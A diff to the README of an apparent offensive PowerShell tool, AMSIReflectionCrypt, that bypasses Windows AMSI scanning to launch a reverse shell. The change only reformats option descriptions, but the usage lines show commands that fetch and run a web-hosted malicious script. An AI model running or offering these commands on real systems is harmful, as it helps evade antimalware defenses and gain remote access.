@@ -12,11 +12,11 @@ in the example shown, the bypass is used to Invoke a reverse shell after AMSI is
   cd AMSIReflectionCrypt
   .\AMSIReflectionCrypt.ps1 -h
 ```
-  -ts  Invoke the TestScript.ps1 from GitHub.
+ * -ts  Invoke the TestScript.ps1 from GitHub.
 ```
 .\AMSIReflectionCrypt.ps1 -ts
 ```
-  -u   Full path to your web hosted malicious PS script (Default - TestScript.ps1 from GitHub).
+ * -u   Full path to your web hosted malicious PS script (Default - TestScript.ps1 from GitHub).
 ```
 .\AMSIReflectionCrypt.ps1 -u https://PATH/TO/script.ps1
 ```
